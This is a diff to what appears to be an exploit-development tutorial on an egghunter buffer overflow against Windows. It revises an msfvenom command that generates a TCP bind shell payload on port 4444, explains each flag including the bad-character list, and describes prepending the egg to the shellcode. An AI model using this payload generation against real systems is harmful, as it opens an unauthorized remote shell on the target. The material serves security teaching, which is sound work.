@@ -300,15 +300,20 @@ Now that we have all the necessary parts for the creation of an exploit we will 
 
 3. We will also need a bind shell, this is a program that listens for connections on the target machine and provides a shell to anyone that makes a tcp connection to the port it is listening on. We can generate the shell with the following command. 
 	```sh
-	$ msfvenom -p windows/shell_bind_tcp RPORT=4444 EXITFUNC=thread -f python -v SHELL -b '\x00'
+	$ msfvenom -p windows/shell_bind_tcp RPORT=4444 EXITFUNC=thread -f python -v SHELL -a x86 --platform windows -b '\x00\x0a\x0d'
 	```
       * `msfvenom`: [Metasploit](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) payload encoder and generator.
       * `-p windows/shell_bind_tcp`: Specify we are using the tcp bind shell payload for windows. 
-      * `RPORT=4444`: Specify the Receiving (Remote) port is 4444. 
-      * `EXITFUNC=thread`: Exit process, this is running as a thread.
-      * `-f python`: Format the output for use in a python program.
-      * `-v SHELL`: Specify SHELL as the variable name.
-      * `-b '\x00'`: Set bad characters.
+        * `RPORT=4444`: Specify the Receiving (Remote) port is 4444. 
+        * `EXITFUNC=thread`: Exit process, this is running as a thread.
+	  * `-f`: The output format. 
+      	* `python`: Format for use in python scripts.
+  	  * `-v`: Specify a custom variable name.
+    	* `SHELL`: Shell Variable name.
+  	  * `-a x86`: Specify the target architecture as `x86`
+	  * `--platform windows`: Specify the target platform as Windows
+  	  * `-b`: Specifies bad chars and byte values. This is given in the byte values. 
+        * `\x00\x0a\x0d`: Null char, carriage return, and newline. 
 
 4. Modify your exploit code to create a byte array representing the shellcode as shown in [exploit5.py](./SourceCode/exploit5.py), remember to prepend the *egg* repeated twice to the *bind* shellcode as this is what the EggHunter will use to identify the start of the shellcode and jump to it!
 	```py
